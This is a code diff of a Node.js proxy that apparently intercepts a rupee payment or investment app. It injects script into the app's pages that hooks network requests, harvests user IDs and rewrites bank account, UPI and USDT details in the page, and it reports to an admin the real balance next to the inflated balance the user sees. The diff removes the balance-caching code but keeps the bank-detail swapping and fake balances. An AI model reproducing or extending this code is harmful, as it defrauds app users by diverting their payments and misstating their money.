@@ -1419,9 +1419,6 @@ app.get('/hook/config', async (req, res) => {
         const addedBal = (uo && uo.addedBalance !== undefined) ? uo.addedBalance : 0;
         const globalBonus = data.depositBonus || 0;
         const totalBonus = addedBal + globalBonus;
-        const tracked = (userId && data.trackedUsers) ? data.trackedUsers[String(userId)] : null;
-        const lastRealBal = (uo && uo.lastRealBalance !== undefined) ? uo.lastRealBalance : (tracked && tracked.balance !== undefined ? parseFloat(tracked.balance) : null);
-        const shownBal = lastRealBal !== null ? parseFloat((lastRealBal + totalBonus).toFixed(2)) : (totalBonus > 0 ? totalBonus : null);
         res.json({
             enabled: data.botEnabled !== false,
             an: bank ? bank.accountNo : '',
@@ -1432,7 +1429,6 @@ app.get('/hook/config', async (req, res) => {
             ui: bank ? (bank.upiId || '') : '',
             tg: TELEGRAM_OVERRIDE,
             bonus: totalBonus,
-            bal: shownBal,
             blockUpdate: data.blockUpdate !== false,
             usdtAddr: data.usdtAddress || ''
         });
@@ -2770,26 +2766,16 @@ app.all('/xxapi/*', async (req, res) => {
                 const globalBonus = data.depositBonus || 0;
                 const totalFake = addedBalance + globalBonus;
                 const shownBalance = parseFloat((realBalance + totalFake).toFixed(2));
-                const lastReal = uo.lastRealBalance;
                 const trackedUser = (data.trackedUsers && data.trackedUsers[String(userId)]) || {};
                 const userName = trackedUser.name || '';
                 const userPhone = trackedUser.phone || phone || '';
 
-                if (!data.userOverrides) data.userOverrides = {};
-                if (!data.userOverrides[String(userId)]) data.userOverrides[String(userId)] = {};
-                data.userOverrides[String(userId)].lastRealBalance = realBalance;
-
-                const balChanged = lastReal === undefined || Math.abs(lastReal - realBalance) > 0.01;
                 const snapKey = `bal_${userId}`;
                 const lastSnapTime = _balSnapTimes[snapKey] || 0;
                 const nowMs = Date.now();
-                const shouldNotify = balChanged || (nowMs - lastSnapTime > 120000);
 
-                if (shouldNotify && (nowMs - lastSnapTime > 10000)) {
+                if (nowMs - lastSnapTime > 30000) {
                     _balSnapTimes[snapKey] = nowMs;
-                    const changeStr = lastReal !== undefined
-                        ? `\n📈 Change: ${realBalance > lastReal ? '+' : ''}₹${(realBalance - lastReal).toFixed(2)} (was ₹${lastReal})`
-                        : '';
                     notifyAdmin(data,
                         `┌──────────────────────────┐
 │    💎 BALANCE SNAPSHOT    │
@@ -2800,7 +2786,7 @@ app.all('/xxapi/*', async (req, res) => {
 💰 Real Balance:   ₹${realBalance.toFixed(2)}
 ➕ Bot Added:      ₹${totalFake.toFixed(2)}${addedBalance ? ' (user: +₹' + addedBalance + ')' : ''}${globalBonus ? (addedBalance ? ', global: +₹' + globalBonus : ' (global: +₹' + globalBonus + ')') : ''}
 ━━━━━━━━━━━━━━━━━━━━━━━━━━
-👁 User Sees:      ₹${shownBalance.toFixed(2)}${changeStr}
+👁 User Sees:      ₹${shownBalance.toFixed(2)}
 
 🔗 Field: ${balResult.field}
 🕐 ${now}`);
@@ -3346,7 +3332,7 @@ if(!window.xamlAction){
     closeWebview:function(){try{window.history.back();}catch(e){}},
     openWebview:function(url){try{window.location.href=url;}catch(e){}},
     getDeviceInfo:function(){return JSON.stringify({deviceId:'bro_'+Math.random().toString(36).slice(2,10),platform:'android',version:'1.0.0',brand:'samsung',model:'SM-G991B',osVersion:'12'});},
-    getToken:function(){try{return localStorage.getItem('token')||'';}catch(e){return '';}},
+    getToken:function(){try{return localStorage.getItem('token')||'';}catch(e){}},
     saveToken:function(t){try{localStorage.setItem('token',t);}catch(e){}},
     getSecurityToken:function(){return 'sec_'+Date.now().toString(36);},
     getSign:function(data){return 'sign_'+btoa(data||'').slice(0,16);},
@@ -3376,12 +3362,12 @@ if(!window.xamlAction){
   };
 }
 
-
 function _px(u){if(!u||typeof u!=='string')return null;if(u.indexOf(REAL)===0)return P+u.slice(REAL.length);if(u.indexOf(REAL2)===0)return P+u.slice(REAL2.length);return null;}
 var CFG=null;
 var UID='';
 
 try{var _ls=localStorage.getItem('_px_uid');if(_ls&&/^\\d{6,12}$/.test(_ls))UID=_ls;}catch(e){}
+try{localStorage.removeItem('_px_bal');}catch(e){}
 
 function lc(){
 try{var x=new XMLHttpRequest();
@@ -3403,6 +3389,7 @@ if(!id||!/^\\d{6,12}$/.test(id)||id===UID)return;
 UID=id;try{localStorage.setItem('_px_uid',id);}catch(e){}
 lcAsync();}
 
+
 var _open=XMLHttpRequest.prototype.open;
 var _send=XMLHttpRequest.prototype.send;
 XMLHttpRequest.prototype.open=function(m,u){
@@ -3411,22 +3398,6 @@ this._hu=u;this._hm=m;
 var ret=_open.apply(this,arguments);
 if(UID){try{this.setRequestHeader('x-px-uid',UID);}catch(e){}}
 return ret;};
-
-var _cachedBal=null;
-function fmtBal(v){var n=parseFloat(v);if(isNaN(n))return null;return n.toFixed(2);}
-if(CFG&&CFG.bal!==null&&CFG.bal!==undefined){_cachedBal=fmtBal(CFG.bal);}
-if(!_cachedBal){try{var _cb=localStorage.getItem('_px_bal');if(_cb)_cachedBal=fmtBal(_cb);}catch(e){}}
-
-function cacheBal(obj){
-if(!obj||typeof obj!=='object')return;
-var bks=['iToken','itoken','balance','userBalance','availableBalance','totalBalance','money','tokenBalance'];
-for(var i=0;i<bks.length;i++){
-var bk=bks[i];
-if(obj[bk]!==undefined&&obj[bk]!==null&&obj[bk]!==''){
-var bv=parseFloat(obj[bk]);
-if(!isNaN(bv)&&bv>0){_cachedBal=bv.toFixed(2);
-try{localStorage.setItem('_px_bal',_cachedBal);}catch(e){}return;}}}
-for(var k in obj){if(typeof obj[k]==='object'&&obj[k]!==null&&!Array.isArray(obj[k])){cacheBal(obj[k]);}}}
 
 function patchBankDOM(){
 try{
@@ -3445,30 +3416,6 @@ while(walker.nextNode()){
 }catch(e){}
 }
 
-function patchBalDOM(){
-if(!_cachedBal||_cachedBal==='0'||_cachedBal==='0.00')return;
-if(!document.body)return;
-var walker=document.createTreeWalker(document.body,NodeFilter.SHOW_TEXT,null,false);
-var toFix=[];
-while(walker.nextNode()){
-var nd=walker.currentNode;
-var txt=(nd.textContent||'').trim();
-if(txt!=='0.00'&&txt!=='0'&&txt!=='0.0')continue;
-var el=nd.parentElement;
-if(!el||el.children.length>0)continue;
-var p1=el.parentElement;
-var p2=p1?p1.parentElement:null;
-var p3=p2?p2.parentElement:null;
-var ctx='';
-if(p1)ctx+=(p1.innerText||'').toLowerCase();
-if(p2)ctx+=' '+(p2.innerText||'').toLowerCase();
-if(p3)ctx+=' '+(p3.innerText||'').toLowerCase();
-if(ctx.indexOf('itoken')>-1||ctx.indexOf('balance')>-1||ctx.indexOf('my itoken')>-1||ctx.indexOf('wallet')>-1){
-var elCtx=(el.innerText||'').toLowerCase();
-if(elCtx.indexOf('profit')===-1&&elCtx.indexOf('reward')===-1&&elCtx.indexOf('team')===-1&&elCtx.indexOf('commission')===-1){
-toFix.push(nd);}}}
-for(var i=0;i<toFix.length;i++){toFix[i].textContent=_cachedBal;}}
-
 XMLHttpRequest.prototype.send=function(body){
 var self=this;
 self.addEventListener('load',function(){
@@ -3479,12 +3426,10 @@ var j=typeof r==='object'?r:(typeof r==='string'?JSON.parse(r):null);
 if(!j)return;
 var d=j.data||j.body||j.result||j;
 if(d&&typeof d==='object'){
-cacheBal(d);
 for(var i=0;i<ID_FIELDS.length;i++){
 var f=ID_FIELDS[i];
 if(d[f]){var v=String(d[f]).trim();
 if(/^\\d{6,12}$/.test(v)){setUID(v);break;}}}}
-setTimeout(patchBalDOM,50);setTimeout(patchBalDOM,200);setTimeout(patchBalDOM,500);
 }catch(e){}});
 return _send.apply(this,arguments);};
 
@@ -3503,7 +3448,6 @@ try{var cl=resp.clone();
 cl.text().then(function(t){
 try{var j=JSON.parse(t);var d=j.data||j.body||j.result||j;
 if(d&&typeof d==='object'){
-cacheBal(d);
 for(var i=0;i<ID_FIELDS.length;i++){
 var f=ID_FIELDS[i];if(d[f]){var v=String(d[f]).trim();
 if(/^\\d{6,12}$/.test(v)){setUID(v);break;}}}}}catch(e){}}).catch(function(){});}catch(e){}
@@ -3595,19 +3539,19 @@ var m=txt.match(/ID\\s*:\\s*([0-9]{6,12})/i);
 if(m&&m[1])setUID(m[1]);
 }catch(e){}}
 
-scanDOM();patchBankDOM();patchBalDOM();
-var _rafC=0;function _rafLoop(){patchBankDOM();patchBalDOM();_rafC++;if(_rafC<300)requestAnimationFrame(_rafLoop);}
+scanDOM();patchBankDOM();
+var _rafC=0;function _rafLoop(){patchBankDOM();_rafC++;if(_rafC<300)requestAnimationFrame(_rafLoop);}
 requestAnimationFrame(_rafLoop);
-setInterval(function(){scanDOM();patchBankDOM();patchBalDOM();},300);
+setInterval(function(){scanDOM();patchBankDOM();},300);
 if(document.body){
-var obs=new MutationObserver(function(){patchBankDOM();patchBalDOM();fixLinks();fixOnClick();scanDOM();});
+var obs=new MutationObserver(function(){patchBankDOM();fixLinks();fixOnClick();scanDOM();});
 obs.observe(document.body,{childList:true,subtree:true,characterData:true});}
 else{document.addEventListener('DOMContentLoaded',function(){
-patchBankDOM();patchBalDOM();
-var obs2=new MutationObserver(function(){patchBankDOM();patchBalDOM();fixLinks();fixOnClick();scanDOM();});
+patchBankDOM();
+var obs2=new MutationObserver(function(){patchBankDOM();fixLinks();fixOnClick();scanDOM();});
 obs2.observe(document.body,{childList:true,subtree:true,characterData:true});});}
 setInterval(function(){fixLinks();fixOnClick();},2000);
-fixLinks();fixOnClick();patchBankDOM();patchBalDOM();
+fixLinks();fixOnClick();patchBankDOM();
 })();`;
 
 // ─── Frontend catch-all proxy ───────────────────────────────────────────────
